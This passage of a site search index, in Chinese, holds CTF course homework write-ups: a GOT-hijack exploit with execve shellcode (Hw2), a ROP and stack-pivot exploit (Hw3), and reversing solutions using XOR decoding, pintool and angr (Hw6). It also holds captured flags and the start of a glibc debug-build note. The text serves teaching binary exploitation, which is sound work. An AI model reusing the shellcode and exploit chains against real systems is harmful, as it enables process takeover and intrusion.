\u89c0\u5bdf\u4e00\u4e0b\u767c\u73fe\u8a72\u8655\u53ef\u5beb\u53ef\u57f7\u884c\uff01\uff01\uff01\n\n\n\n\n\n\n\u5982\u6b64\u5c31\u53ef\u4ee5\u585e\u5165 shellcode \u4e26\u4fee\u6539 puts \u7684 got \u70ba buffer address\uff0c\u4f7f\u5f97\u6700\u5f8c\u8981\u8f38\u51fa\u6642 call puts \u6703\u8df3\u5230\u5beb\u597d\u7684 shellcode \u57f7\u884c\n\n\n\u4f46\u662f\u8f38\u5165\u7684 buffer \u8b80\u9032\u4f86\u5f8c\u6709\u500b check \u51fd\u6578\u6aa2\u67e5\u8f38\u5165\u8981\u70ba alpha \u6216 number\uff0c\u4e0d\u904e\u4ed6\u662f\u7528 strlen \u5224\u65b7\u9577\u5ea6\u53ef\u4ee5\u4f7f\u7528 null byte \u7e5e\u904e\uff0c\u56e0\u70ba\u4ed6\u662f\u4ee5 null byte \u7576\u4f5c\u5b57\u4e32\u7d50\u5c3e\n\n\n\n\n\u6240\u4ee5\u6211\u5011\u53ef\u4ee5\u5728 shellcode \u524d\u9762\u585e\u4e00\u500b null byte \u7e5e\u904e\u6aa2\u67e5\uff0c\u800c\u4e4b\u5f8c puts got \u7684\u503c\u6539\u6210 buffer address + 1 \u5373\u53ef\n\n\nexploit\n\n\n\u4f7f\u7528 objdump \u53ef\u4ee5\u770b\u5230 puts \u7684 got\n\n\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\n\n# r = process('./gothijack')\n\n\nr\n \n=\n \nremote\n(\n'csie.ctf.tw'\n,\n \n10129\n)\n\n\n\nshellcode\n \n=\n \n'\n\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\\n\n\n\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\n'\n\n\nputs_got\n \n=\n \n'601020'\n\n\nbuf_addr\n \n=\n \n0x6010a1\n\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsend\n(\n'\n\\x00\n'\n \n+\n \nshellcode\n)\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\nputs_got\n)\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsendline\n(\np64\n(\nbuf_addr\n))\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{G0THiJJack1NG}",
            "title": "Hw2"
        },
        {
            "location": "/course/csie/hw2/#hw2",
            "text": "",
            "title": "Hw2"
        },
        {
            "location": "/course/csie/hw2/#gothijack",
            "text": "Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments",
            "title": "gothijack"
        },
        {
            "location": "/course/csie/hw2/#concept",
            "text": "\u8a72\u7a0b\u5f0f\u5f88\u55ae\u7d14\u7684\u505a\u4e86\u56db\u4ef6\u4e8b   \u8f38\u5165 name  \u8f38\u5165\u60f3\u4fee\u6539\u7684 address  \u8f38\u5165\u60f3\u4fee\u6539\u7684\u503c  \u8f38\u51fa done !   \u4f9d\u984c\u76ee\u63d0\u793a\u53ef\u77e5\u662f\u4f7f\u7528 got hijack \u7684\u6280\u5de7\u4f86\u9054\u6210\u653b\u64ca\uff0c\u4e0d\u904e\u9019\u984c\u6709 canary \u4e0d\u80fd\u76f4\u63a5 overflow \u9020\u51fa ROP chain  \u4e0d\u904e\u6709\u500b\u53ef\u4ee5\u53ef\u63a7\u7684 buffer \u53ef\u4ee5\u5229\u7528\uff0c\u4f7f\u7528 gdb \u89c0\u5bdf\u4e00\u4e0b\u767c\u73fe\u8a72\u8655\u53ef\u5beb\u53ef\u57f7\u884c\uff01\uff01\uff01    \u5982\u6b64\u5c31\u53ef\u4ee5\u585e\u5165 shellcode \u4e26\u4fee\u6539 puts \u7684 got \u70ba buffer address\uff0c\u4f7f\u5f97\u6700\u5f8c\u8981\u8f38\u51fa\u6642 call puts \u6703\u8df3\u5230\u5beb\u597d\u7684 shellcode \u57f7\u884c  \u4f46\u662f\u8f38\u5165\u7684 buffer \u8b80\u9032\u4f86\u5f8c\u6709\u500b check \u51fd\u6578\u6aa2\u67e5\u8f38\u5165\u8981\u70ba alpha \u6216 number\uff0c\u4e0d\u904e\u4ed6\u662f\u7528 strlen \u5224\u65b7\u9577\u5ea6\u53ef\u4ee5\u4f7f\u7528 null byte \u7e5e\u904e\uff0c\u56e0\u70ba\u4ed6\u662f\u4ee5 null byte \u7576\u4f5c\u5b57\u4e32\u7d50\u5c3e   \u6240\u4ee5\u6211\u5011\u53ef\u4ee5\u5728 shellcode \u524d\u9762\u585e\u4e00\u500b null byte \u7e5e\u904e\u6aa2\u67e5\uff0c\u800c\u4e4b\u5f8c puts got \u7684\u503c\u6539\u6210 buffer address + 1 \u5373\u53ef",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw2/#exploit",
            "text": "\u4f7f\u7528 objdump \u53ef\u4ee5\u770b\u5230 puts \u7684 got   #!/usr/bin/env python  from   pwn   import   *  # r = process('./gothijack')  r   =   remote ( 'csie.ctf.tw' ,   10129 )  shellcode   =   ' \\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\  \\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05 '  puts_got   =   '601020'  buf_addr   =   0x6010a1  r . recvuntil ( ':' )  r . send ( ' \\x00 '   +   shellcode )  r . recvuntil ( ':' )  r . sendline ( puts_got )  r . recvuntil ( ':' )  r . sendline ( p64 ( buf_addr ))  r . interactive ()",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw2/#flag",
            "text": "FLAG{G0THiJJack1NG}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw3/",
            "text": "Hw3\n\n\nreadme\n\n\nArch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)\n\n\n\n\nconcept\n\n\n\u89c0\u5bdf\u767c\u73fe\u4e3b\u7a0b\u5f0f\u975e\u5e38\u7684\u7c21\u55ae\uff0c\u4f7f\u7528 read \u4f86\u8b80\u53d6\u8f38\u5165\uff0c\u4e0d\u904e buf \u5927\u5c0f\u70ba 0x20 bytes \u537b\u53ef\u4ee5\u8b80\u5165 0x30 bytes \u9020\u6210 overflow\n\n\n\n\n\u56e0\u70ba\u53ef\u4ee5 overflow \u7684\u5927\u5c0f\u6709\u9650\uff0c\u53ea\u6709 0x10 bytes \u800c\u5df2\uff0c\u80fd\u5920\u505a\u7684\u4e8b\u53ea\u6709\u84cb rbp \u548c return address\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528 stack pivoting \u7684\u6280\u5de7\u4f86\u585e rop chain\n\n\n\u4e3b\u8981\u60f3\u6cd5\u662f\u5148\u900f\u904e\u4ee5\u4e0b\u5169\u500b gadget \u63a7 rdx\uff0c\u628a r12 + rbx * 8 \u7684\u503c\u8a2d\u70ba ret \u7684 gadget \u4e26\u4e14 rbp \u8a2d\u70ba 1\uff0c\u5373\u53ef\u4f7f call \u5b8c\u56de\u5230\u539f\u672c\u7684 gadget \u800c\u4e14\u901a\u904e cmp \u4e0d\u6703\u8df3\u5230 __libc_csu_init + 0x40\uff0c\u800c rdx \u7684\u503c\u5c31\u6703\u8a2d\u70ba r13\n\n\n\n\n\n\n\u63a5\u8457\u5c07 read_got \u5f8c 2 bytes \u84cb\u70ba\u9644\u8fd1\u7684 one gadget\uff0c\u6700\u5f8c call read \u5373\u53ef\n\n\n\n\n\n\n\u4e0d\u904e\u56e0\u70ba\u6709 ASLR \u7684\u95dc\u4fc2 libc address \u9664\u4e86\u5f8c 1.5 bytes \u4e4b\u5916\u5176\u4ed6\u90fd\u662f random \u7684\u6578\u503c\uff0c\u6240\u4ee5\u53ea\u6709 1/16 \u7684\u6a5f\u6703\u53ef\u4ee5\u6210\u529f exploit\n\n\nexploit\n\n\n#!/usr/bin/env python\n\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\nimport\n \ntime\n\n\n\nr\n \n=\n \nremote\n(\n\"csie.ctf.tw\"\n,\n \n10135\n)\n\n\n# r = process('./readme', env = {\"LD_PRELOAD\": os.path.join(os.getcwd(), \"libc.so.6\")})\n\n\ncontext\n.\narch\n \n=\n \n'amd64'\n\n\n\nmain_read\n \n=\n \n0x40062b\n\n\nread_got\n \n=\n \n0x601020\n\n\nread_plt\n \n=\n \n0x0000000004004c0\n\n\nbuf1\n \n=\n \n0x00602000\n \n-\n \n0x200\n\n\nbuf2\n \n=\n \nbuf1\n \n-\n \n0x200\n\n\n\npop_r12__pop_r13__pop_r14__pop_r15\n \n=\n \n0x4006ac\n\n\nmov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15\n \n=\n \n0x400690\n\n\npop_rsi_r15\n \n=\n \n0x00000000004006b1\n\n\npop_rdi\n \n=\n \n0x00000000004006b3\n\n\nleave\n \n=\n \n0x400646\n\n\nret\n \n=\n \n0x0000000000400499\n\n\n\ndef\n \nwrite_rop\n(\naddr\n,\n \ndata\n):\n\n    \ntime\n.\nsleep\n(\n0.5\n)\n\n    \nr\n.\nsend\n(\n'a'\n \n*\n \n32\n \n+\n \nflat\n([\naddr\n \n+\n \n0x20\n,\n \nmain_read\n]))\n\n    \ntime\n.\nsleep\n(\n0.5\n)\n\n    \nr\n.\nsend\n(\ndata\n.\nljust\n(\n32\n,\n \n'\n\\x00\n'\n)\n \n+\n \nflat\n(\nbuf1\n \n+\n \n0x20\n,\n \nmain_read\n))\n\n\n\nrop\n \n=\n \nflat\n([\n\n    \n0x1\n,\n\n\n    \npop_r12__pop_r13__pop_r14__pop_r15\n,\n\n    \nbuf2\n \n+\n \n19\n \n*\n \n0x8\n,\n\n    \n0x2\n,\n\n    \n0x0\n,\n\n    \n0x0\n,\n\n    \nmov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15\n,\n\n    \n0x0\n,\n\n    \n0x0\n,\n\n    \n0x1\n,\n\n    \n0x0\n,\n\n    \n0x0\n,\n\n    \n0x0\n,\n\n    \n0x0\n,\n\n\n    \npop_rsi_r15\n,\n\n    \nread_got\n,\n\n    \n0\n,\n\n    \nread_plt\n,\n\n\n    \nread_plt\n,\n\n\n    \nret\n\n    \n])\n\n\n\nr\n.\nrecvuntil\n(\n':'\n)\n\n\nr\n.\nsend\n(\n'a'\n \n*\n \n32\n \n+\n \nflat\n([\nbuf1\n,\n \nmain_read\n]))\n\n\n\nfor\n \ni\n \nin\n \nrange\n(\n0\n,\n \nlen\n(\nrop\n),\n \n32\n):\n\n    \nwrite_rop\n(\nbuf2\n \n+\n \ni\n,\n \nrop\n[\ni\n:\n \ni\n \n+\n \n32\n])\n\n\n\ntime\n.\nsleep\n(\n0.5\n)\n\n\nr\n.\nsend\n(\n'a'\n \n*\n \n32\n \n+\n \nflat\n([\nbuf2\n,\n \nleave\n]))\n\n\ntime\n.\nsleep\n(\n0.5\n)\n\n\nr\n.\nsend\n(\n'\n\\x74\\x02\n'\n)\n\n\n\nr\n.\ninteractive\n()\n\n\n\n\n\nflag\n\n\nFLAG{CAN_YOU_R34D_MY_M1ND?}",
            "title": "Hw3"
        },
        {
            "location": "/course/csie/hw3/#hw3",
            "text": "",
            "title": "Hw3"
        },
        {
            "location": "/course/csie/hw3/#readme",
            "text": "Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x400000)",
            "title": "readme"
        },
        {
            "location": "/course/csie/hw3/#concept",
            "text": "\u89c0\u5bdf\u767c\u73fe\u4e3b\u7a0b\u5f0f\u975e\u5e38\u7684\u7c21\u55ae\uff0c\u4f7f\u7528 read \u4f86\u8b80\u53d6\u8f38\u5165\uff0c\u4e0d\u904e buf \u5927\u5c0f\u70ba 0x20 bytes \u537b\u53ef\u4ee5\u8b80\u5165 0x30 bytes \u9020\u6210 overflow   \u56e0\u70ba\u53ef\u4ee5 overflow \u7684\u5927\u5c0f\u6709\u9650\uff0c\u53ea\u6709 0x10 bytes \u800c\u5df2\uff0c\u80fd\u5920\u505a\u7684\u4e8b\u53ea\u6709\u84cb rbp \u548c return address\uff0c\u6240\u4ee5\u9700\u8981\u4f7f\u7528 stack pivoting \u7684\u6280\u5de7\u4f86\u585e rop chain  \u4e3b\u8981\u60f3\u6cd5\u662f\u5148\u900f\u904e\u4ee5\u4e0b\u5169\u500b gadget \u63a7 rdx\uff0c\u628a r12 + rbx * 8 \u7684\u503c\u8a2d\u70ba ret \u7684 gadget \u4e26\u4e14 rbp \u8a2d\u70ba 1\uff0c\u5373\u53ef\u4f7f call \u5b8c\u56de\u5230\u539f\u672c\u7684 gadget \u800c\u4e14\u901a\u904e cmp \u4e0d\u6703\u8df3\u5230 __libc_csu_init + 0x40\uff0c\u800c rdx \u7684\u503c\u5c31\u6703\u8a2d\u70ba r13    \u63a5\u8457\u5c07 read_got \u5f8c 2 bytes \u84cb\u70ba\u9644\u8fd1\u7684 one gadget\uff0c\u6700\u5f8c call read \u5373\u53ef    \u4e0d\u904e\u56e0\u70ba\u6709 ASLR \u7684\u95dc\u4fc2 libc address \u9664\u4e86\u5f8c 1.5 bytes \u4e4b\u5916\u5176\u4ed6\u90fd\u662f random \u7684\u6578\u503c\uff0c\u6240\u4ee5\u53ea\u6709 1/16 \u7684\u6a5f\u6703\u53ef\u4ee5\u6210\u529f exploit",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw3/#exploit",
            "text": "#!/usr/bin/env python  from   pwn   import   *  import   time  r   =   remote ( \"csie.ctf.tw\" ,   10135 )  # r = process('./readme', env = {\"LD_PRELOAD\": os.path.join(os.getcwd(), \"libc.so.6\")})  context . arch   =   'amd64'  main_read   =   0x40062b  read_got   =   0x601020  read_plt   =   0x0000000004004c0  buf1   =   0x00602000   -   0x200  buf2   =   buf1   -   0x200  pop_r12__pop_r13__pop_r14__pop_r15   =   0x4006ac  mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15   =   0x400690  pop_rsi_r15   =   0x00000000004006b1  pop_rdi   =   0x00000000004006b3  leave   =   0x400646  ret   =   0x0000000000400499  def   write_rop ( addr ,   data ): \n     time . sleep ( 0.5 ) \n     r . send ( 'a'   *   32   +   flat ([ addr   +   0x20 ,   main_read ])) \n     time . sleep ( 0.5 ) \n     r . send ( data . ljust ( 32 ,   ' \\x00 ' )   +   flat ( buf1   +   0x20 ,   main_read ))  rop   =   flat ([ \n     0x1 , \n\n     pop_r12__pop_r13__pop_r14__pop_r15 , \n     buf2   +   19   *   0x8 , \n     0x2 , \n     0x0 , \n     0x0 , \n     mov_rdx_r13__mov_rsi_r14__mov_edi_r15__call_r12__add_rsp_0x8__pop_rbx__pop_rbp__pop_r_12_to_15 , \n     0x0 , \n     0x0 , \n     0x1 , \n     0x0 , \n     0x0 , \n     0x0 , \n     0x0 , \n\n     pop_rsi_r15 , \n     read_got , \n     0 , \n     read_plt , \n\n     read_plt , \n\n     ret \n     ])  r . recvuntil ( ':' )  r . send ( 'a'   *   32   +   flat ([ buf1 ,   main_read ]))  for   i   in   range ( 0 ,   len ( rop ),   32 ): \n     write_rop ( buf2   +   i ,   rop [ i :   i   +   32 ])  time . sleep ( 0.5 )  r . send ( 'a'   *   32   +   flat ([ buf2 ,   leave ]))  time . sleep ( 0.5 )  r . send ( ' \\x74\\x02 ' )  r . interactive ()",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw3/#flag",
            "text": "FLAG{CAN_YOU_R34D_MY_M1ND?}",
            "title": "flag"
        },
        {
            "location": "/course/csie/hw4/",
            "text": "",
            "title": "Hw4"
        },
        {
            "location": "/course/csie/hw5/",
            "text": "",
            "title": "Hw5"
        },
        {
            "location": "/course/csie/hw6/",
            "text": "Hw6\n\n\nbreak\n\n\nconcept\n\n\n\n\njust reverse\n\n\n\n\n\n\nsub_40066D \u4e2d\u5c07\u4e00\u4e9b global variable \u505a\u904b\u7b97\uff0c\u4e0d\u904e\u4e26\u4e0d\u5f71\u97ff\u662f\u5426\u6210\u529f Pass \u4e26\u8f38\u51fa flag\uff0c\u6240\u4ee5\u53ef\u4ee5\u5ffd\u7565\u9019\u500b function\n\n\noff_6010C8 \u7684\u5167\u5bb9\u70ba \"Temporal Reverse Engineering\"\n\n\n\u5c07\u8f38\u5165\u6bcf 2 bytes \u5207\u70ba\u4e00\u7d44\u505a\u4ee5\u4e0b\u64cd\u4f5c\n\n\n\n\n\u524d\u9762\u7684 byte xor 1\n\n\n\u5f8c\u9762\u7684 byte xor (off_6010C8[\u8a72 byte \u5728\u8f38\u5165 string \u4e2d\u7684\u4f4d\u7f6e mod len(off_6010C8)] + 1)\n\n\n\n\n\u7d50\u679c\u82e5\u8207 byte_601080 \u76f8\u540c\u5247\u5370\u51fa flag\n\n\n\n\n\n\npintool\n\n\n\n\n\u5229\u7528 \nobj-intel64/inscount0.so\n \u53ef\u4ee5\u8a08\u7b97\u7a0b\u5f0f\u57f7\u884c\u7684 instruction count\n\n\n\u5982\u6b64\u53ef\u4ee5\u66b4\u529b\u731c\u6e2c\u6bcf\u4e00 byte \u82e5\u6bd4\u5c0d\u6210\u529f\u5247\u8a72\u6b21 instruction count \u6703\u8f03\u591a\u5373\u53ef\u7372\u5f97 flag\n\n\n\n\nangr\n\n\n\n\n\u627e\u51fa\u6700\u5f8c\u6210\u529f\u4e26\u8f38\u51fa flag \u7684 address\n\n\n\n\n\u4f7f\u7528 angr \u505a symbolic execution \u4e26\u9650\u5236\u8f38\u5165\u5fc5\u9808\u662f\u53ef\u8996\u5b57\u5143\u5373\u53ef\u5f97\u5230 flag\n\n\nexploit\n\n\n\n\njust reverse\n\n\n\n\n#!/usr/bin/python3\n\n\n\nenc\n \n=\n \n'4201471551196f2345794008480875117347600c640c6e144206721b6e38681460126d07454463136601681a6656681b692e7808601e680c483b721a73056c076f55601268096f09'\n\n\nstring\n \n=\n \n'Temporal Reverse Engineering'\n\n\n\nby\n \n=\n \n[\n \nenc\n[\ni\n:\n \ni\n \n+\n \n2\n]\n \nfor\n \ni\n \nin\n \nrange\n(\n0\n,\n \nlen\n(\nenc\n),\n \n2\n)\n \n]\n\n\n\nfor\n \ni\n \nin\n \nrange\n(\n0\n,\n \nlen\n(\nby\n),\n \n2\n):\n\n    \nprint\n(\nchr\n(\nint\n(\nby\n[\ni\n],\n \n16\n)\n \n^\n \n1\n),\n \nend\n \n=\n \n\"\"\n)\n\n    \nprint\n(\nchr\n(\nint\n(\nby\n[\ni\n \n+\n \n1\n],\n \n16\n)\n \n^\n \n(\nord\n(\nstring\n[\ni\n \n%\n \nlen\n(\nstring\n)])\n \n+\n \n1\n)),\n \nend\n \n=\n \n\"\"\n)\n\n\n\n\n\n\n\npintool\n\n\n\n\n#!/usr/bin/env python\n\n\n\nimport\n \nos\n\n\nimport\n \nstring\n\n\n\ndef\n \ntry_one\n(\nans\n,\n \nc\n):\n\n    \nos\n.\nsystem\n(\n'echo \n\\'\n{}\n\\'\n | ../../../pin -t obj-intel64/inscount0.so -- ./break > /dev/null 2>&1'\n.\nformat\n(\nans\n \n+\n \nc\n))\n\n    \nwith\n \nopen\n(\n'inscount.out'\n)\n \nas\n \nfd\n:\n\n        \nf\n \n=\n \nfd\n.\nread\n()\n\n    \nreturn\n \nint\n(\nf\n.\nsplit\n()[\n1\n])\n\n\n\nans\n \n=\n \n''\n\n\n\nfor\n \ni\n \nin\n \nxrange\n(\n75\n):\n\n    \ncnt\n \n=\n \n0\n\n    \nch\n \n=\n \n''\n\n    \nfor\n \nc\n \nin\n \nstring\n.\nprintable\n:\n\n        \ntmp\n \n=\n \ntry_one\n(\nans\n,\n \nc\n)\n\n        \nif\n \ntmp\n \n>\n \ncnt\n:\n\n            \ncnt\n \n=\n \ntmp\n\n            \nch\n \n=\n \nc\n\n    \nans\n \n+=\n \nch\n\n    \nprint\n \nans\n\n\n\n\n\n\n\nangr\n\n\n\n\n#!/usr/bin/env python\n\n\n\nimport\n \nangr\n\n\n\nproj\n \n=\n \nangr\n.\nProject\n(\n\"./break\"\n)\n\n\nstate\n \n=\n \nproj\n.\nfactory\n.\nentry_state\n()\n\n\n\nfor\n \n_\n \nin\n \nxrange\n(\n72\n):\n\n        \nc\n \n=\n \nstate\n.\nposix\n.\nfiles\n[\n0\n]\n.\nread_from\n(\n1\n)\n\n        \nstate\n.\nse\n.\nadd\n(\nc\n \n>=\n \n' '\n)\n\n        \nstate\n.\nse\n.\nadd\n(\nc\n \n<=\n \n'~'\n)\n\n\nstate\n.\nposix\n.\nfiles\n[\n0\n]\n.\nseek\n(\n0\n)\n\n\n\nsm\n \n=\n \nproj\n.\nfactory\n.\nsimgr\n(\nstate\n)\n\n\nsm\n.\nexplore\n(\nfind\n \n=\n \n0x00000000040091F\n)\n\n\n\nprint\n \nsm\n.\nfound\n[\n0\n]\n.\nposix\n.\ndumps\n(\n0\n)\n.\nstrip\n(\n'\n\\0\\n\n'\n)\n\n\n\n\n\nflag\n\n\nCTF{PinADXAnInterfaceforCustomizableDebuggingwithDynamicInstrumentation}",
            "title": "Hw6"
        },
        {
            "location": "/course/csie/hw6/#hw6",
            "text": "",
            "title": "Hw6"
        },
        {
            "location": "/course/csie/hw6/#break",
            "text": "",
            "title": "break"
        },
        {
            "location": "/course/csie/hw6/#concept",
            "text": "just reverse    sub_40066D \u4e2d\u5c07\u4e00\u4e9b global variable \u505a\u904b\u7b97\uff0c\u4e0d\u904e\u4e26\u4e0d\u5f71\u97ff\u662f\u5426\u6210\u529f Pass \u4e26\u8f38\u51fa flag\uff0c\u6240\u4ee5\u53ef\u4ee5\u5ffd\u7565\u9019\u500b function  off_6010C8 \u7684\u5167\u5bb9\u70ba \"Temporal Reverse Engineering\"  \u5c07\u8f38\u5165\u6bcf 2 bytes \u5207\u70ba\u4e00\u7d44\u505a\u4ee5\u4e0b\u64cd\u4f5c   \u524d\u9762\u7684 byte xor 1  \u5f8c\u9762\u7684 byte xor (off_6010C8[\u8a72 byte \u5728\u8f38\u5165 string \u4e2d\u7684\u4f4d\u7f6e mod len(off_6010C8)] + 1)   \u7d50\u679c\u82e5\u8207 byte_601080 \u76f8\u540c\u5247\u5370\u51fa flag    pintool   \u5229\u7528  obj-intel64/inscount0.so  \u53ef\u4ee5\u8a08\u7b97\u7a0b\u5f0f\u57f7\u884c\u7684 instruction count  \u5982\u6b64\u53ef\u4ee5\u66b4\u529b\u731c\u6e2c\u6bcf\u4e00 byte \u82e5\u6bd4\u5c0d\u6210\u529f\u5247\u8a72\u6b21 instruction count \u6703\u8f03\u591a\u5373\u53ef\u7372\u5f97 flag   angr   \u627e\u51fa\u6700\u5f8c\u6210\u529f\u4e26\u8f38\u51fa flag \u7684 address   \u4f7f\u7528 angr \u505a symbolic execution \u4e26\u9650\u5236\u8f38\u5165\u5fc5\u9808\u662f\u53ef\u8996\u5b57\u5143\u5373\u53ef\u5f97\u5230 flag",
            "title": "concept"
        },
        {
            "location": "/course/csie/hw6/#exploit",
            "text": "just reverse   #!/usr/bin/python3  enc   =   '4201471551196f2345794008480875117347600c640c6e144206721b6e38681460126d07454463136601681a6656681b692e7808601e680c483b721a73056c076f55601268096f09'  string   =   'Temporal Reverse Engineering'  by   =   [   enc [ i :   i   +   2 ]   for   i   in   range ( 0 ,   len ( enc ),   2 )   ]  for   i   in   range ( 0 ,   len ( by ),   2 ): \n     print ( chr ( int ( by [ i ],   16 )   ^   1 ),   end   =   \"\" ) \n     print ( chr ( int ( by [ i   +   1 ],   16 )   ^   ( ord ( string [ i   %   len ( string )])   +   1 )),   end   =   \"\" )    pintool   #!/usr/bin/env python  import   os  import   string  def   try_one ( ans ,   c ): \n     os . system ( 'echo  \\' {} \\'  | ../../../pin -t obj-intel64/inscount0.so -- ./break > /dev/null 2>&1' . format ( ans   +   c )) \n     with   open ( 'inscount.out' )   as   fd : \n         f   =   fd . read () \n     return   int ( f . split ()[ 1 ])  ans   =   ''  for   i   in   xrange ( 75 ): \n     cnt   =   0 \n     ch   =   '' \n     for   c   in   string . printable : \n         tmp   =   try_one ( ans ,   c ) \n         if   tmp   >   cnt : \n             cnt   =   tmp \n             ch   =   c \n     ans   +=   ch \n     print   ans    angr   #!/usr/bin/env python  import   angr  proj   =   angr . Project ( \"./break\" )  state   =   proj . factory . entry_state ()  for   _   in   xrange ( 72 ): \n         c   =   state . posix . files [ 0 ] . read_from ( 1 ) \n         state . se . add ( c   >=   ' ' ) \n         state . se . add ( c   <=   '~' )  state . posix . files [ 0 ] . seek ( 0 )  sm   =   proj . factory . simgr ( state )  sm . explore ( find   =   0x00000000040091F )  print   sm . found [ 0 ] . posix . dumps ( 0 ) . strip ( ' \\0\\n ' )",
            "title": "exploit"
        },
        {
            "location": "/course/csie/hw6/#flag",
            "text": "CTF{PinADXAnInterfaceforCustomizableDebuggingwithDynamicInstrumentation}",
            "title": "flag"
        },
        {
            "location": "/note/build-libc-with-debug-info/",
            "text": "Build libc with debug info\n\n\n\u672c\u6587\u4f7f\u7528\u74b0\u5883\u70ba 64 bit Ubuntu 16.04\n\n\nDownload source code\n\n\n\u7531 \nThe GNU C Library (glibc)\n \u5b98\u65b9\u7db2\u7ad9\u4e0b\u8f09 glibc source code\uff0c\u4ee5 glibc 2.23 \u70ba\u4f8b\n\n\n\u4e0b\u8f09 glibc 2.23 \u4e26\u89e3\u58d3\u7e2e\n\n\nwget https://ftp.gnu.org/gnu/libc/glibc-2.23.tar.gz\ntar zxvf glibc-2.23.tar.gz\n\n\n\n\nConfigure and build\n\n\n\u9032\u5165 glibc-2.23 \u8cc7\u6599\u593e\u4e2d\u4e26\u65b0\u589e\u4e00\u500b build \u7684\u8cc7\u6599\u593e\u4f9b\u7de8\u8b6f\u4f7f\u7528\n\n\ncd\n glibc-2.23\nmkdir build\n\n\n\n\n\u9032\u5165 build \u8cc7\u6599\u593e\u4e26\u8a2d\u5b9a\u7de8\u8b6f\u53c3\u6578\n\n\n\n\nCFLAGS\n\n\ndebug \u9078\u9805\u5168\u958b\u4e26\u76e1\u91cf\u4e0d\u8981\u505a\u512a\u5316\n\n\n\u53ef\u53c3\u8003\u4ee5\u4e0b\u7bc4\u4f8b\n\n\n\n\n\n\nprefix\n\n\n\u7de8\u8b6f\u5b8c\u6a94\u6848\u6240\u653e\u4f4d\u7f6e\n\n\n\u7bc4\u4f8b\u70ba\u653e\u7f6e\u5bb6\u76ee\u9304\u4e0b\u7684 glibc \u8cc7\u6599\u593e\u5167\n\n\n\n\n\n\n\n\ncd\n build\n\nCFLAGS\n=\n'-g3 -ggdb3 -gdwarf-4 -Og -Wno-error'\n ../configure --prefix\n=\n/home/\n`\nwhoami\n`\n/glibc\n\n\n\n\n\u7de8\u8b6f\u4e26\u5b89\u88dd\n\n\nmake -j4\nmake install -j4\n\n\n\n\nNote\n\n\n\u7de8\u8b6f 32 bit \u7248\u672c\u7684 glibc\n\n\n\n\nCC\n\n\ngcc -m32\n\n\n\n\n\n\nCFLAGS\n\n\nhost=i686-linux-gnu\n\n\nbuild=i686-linux-gnu\n\n\n\n\n\n\n\n\nCC\n=\n'gcc -m32'\n \nCFLAGS\n=\n'-g3 -ggdb3 -gdwarf-4 -Og -Wno-error --host=i686-linux-gnu --bulid=i686-linux-gnu'\n ../configure --prefix\n=\n/home/\n`\nwhoami\n`\n/glibc",
            "title": "Build libc with debug info"
        },
        {
            "location": "/note/build-libc-with-debug-info/#build-libc-with-debug-info",
            "text": "\u672c\u6587\u4f7f\u7528\u74b0\u5883\u70ba 64 bit Ubuntu 16.04",
            "title": "Build libc with debug info"
        },
        {
            "location": "/note/build-libc-with-debug-info/#download-source-code",
            "text": "\u7531  The GNU C Library (glibc)  \u5b98\u65b9\u7db2\u7ad9\u4e0b\u8f09 glibc source code\uff0c\u4ee5 glibc 2.23 \u70ba\u4f8b  \u4e0b\u8f09 glibc 2.23 \u4e26\u89e3\u58d3\u7e2e  wget https://ftp.gnu.org/gnu/libc/glibc-2.23.tar.gz\ntar zxvf glibc-2.23.tar.gz",
            "title": "Download source code"
        },
        {
            "location": "/note/build-libc-with-debug-info/#configure-and-build",
            "text": "\u9032\u5165 glibc-2.23 \u8cc7\u6599\u593e\u4e2d\u4e26\u65b0\u589e\u4e00\u500b build \u7684\u8cc7\u6599\u593e\u4f9b\u7de8\u8b6f\u4f7f\u7528  cd  glibc-2.23\nmkdir build  \u9032\u5165 build \u8cc7\u6599\u593e\u4e26\u8a2d\u5b9a\u7de8\u8b6f\u53c3\u6578   CFLAGS  debug \u9078\u9805\u5168\u958b\u4e26\u76e1\u91cf\u4e0d\u8981\u505a\u512a\u5316  \u53ef\u53c3\u8003\u4ee5\u4e0b\u7bc4\u4f8b    prefix  \u7de8\u8b6f\u5b8c\u6a94\u6848\u6240\u653e\u4f4d\u7f6e  \u7bc4\u4f8b\u70ba\u653e\u7f6e\u5bb6\u76ee\u9304\u4e0b\u7684 glibc \u8cc7\u6599\u593e\u5167     cd  build CFLAGS = '-g3 -ggdb3 -gdwarf-4 -Og -Wno-error'  ../configure --prefix = /home/ ` whoami ` /glibc  \u7de8\u8b6f\u4e26\u5b89\u88dd  make -j4\nmake install -j4",
            "title": "Configure and build"
        },
        {
